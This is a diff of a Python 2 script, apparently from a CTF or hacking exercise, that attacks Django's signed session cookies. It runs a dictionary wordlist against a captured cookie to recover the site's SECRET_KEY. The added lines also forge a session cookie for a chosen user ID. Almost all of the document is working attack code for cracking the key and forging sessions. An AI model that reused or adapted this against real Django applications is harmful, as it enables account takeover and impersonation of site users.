@@ -1,7 +1,7 @@
-from django.contrib.sessions.backends.db import SessionStore
 from django.conf import settings
 from django.core import signing
 from django.core.signing import *
+from django.utils import crypto
 import sys 
 import time
 
@@ -9,7 +9,8 @@ import time
 #execfile('brute.py')
 
 # Signing algorithm, equivalent to signing.dumps()
-common_salt="django.core.signing"
+common_salt=force_str("django.core.signing.get_cookie_signer")
+sessionid = "eyJ1c2VyIjoiODY0NDU3In0:1YlGx9:TPJDRoQ48cY65lKxVhExR72HNq4"
 def sign(obj):
     global common_salt
     data = b64_encode(JSONSerializer().dumps(obj))
@@ -34,15 +35,38 @@ def unsign(data):
     data = b64_decode(value)
     return JSONSerializer().loads(data)
 
-sessionid = "eyJ1c2VyIjoiODA1MTMxIn0:1Yki06:uXJInrBIb9wBuD2fvTYbvndibKg"
-for key in open('/home/chesley/Dropbox/tmp/web-d/dictionary.txt').readlines():
-    settings.SECRET_KEY = key.strip()
-    print "'%s'" % (settings.SECRET_KEY)
-    a = unsign(sessionid)
-    if a != '':
-        print "Possible secret key: " + key.strip()
-        with open('/home/chesley/Dropbox/tmp/web-d/brute.out', 'a') as f:
-            f.write(key.strip())
-            sys.exit(0)
+def brute():
+    global sessionid
+    for key in open('/home/chesley/Dropbox/tmp/web-d/dictionary.txt').readlines():
+        settings.SECRET_KEY = key.strip()
+        print "'%s'" % (settings.SECRET_KEY)
+        try:
+            #a = get_cookie_signer().unsign(sessionid)
+            a = loads(sessionid, key=b'django.http.cookies'+settings.SECRET_KEY, salt=common_salt)
 
+            print "Possible secret key: " + key.strip()
+            with open('/home/chesley/Dropbox/tmp/web-d/brute.out', 'a') as f:
+                f.write(key.strip())
+                sys.exit(0)
+        except BadSignature, e:
+            pass
 
+def brute_unsign(data):
+    global common_salt
+    keys = open('/home/chesley/Dropbox/tmp/web-d/dictionary.txt').readlines()[0:1000]
+    data = force_str(data)
+    value, sig = data.rsplit(':', 1)
+    print value, sig
+    for key in keys:
+        key = key.strip()
+        print key
+        #if sig == force_str(base64_hmac(common_salt + 'signer', value, key)):
+        if sig == force_str(base64_hmac(common_salt + 'signer', value, key)):
+            result = force_text(value)
+            print "MATCH:" + key
+            return key
+
+fakesessionid=get_cookie_signer().sign(b64_encode(JSONSerializer().dumps({"user":"864457"})))
+print fakesessionid
+get_cookie_signer().unsign(fakesessionid)
+brute()
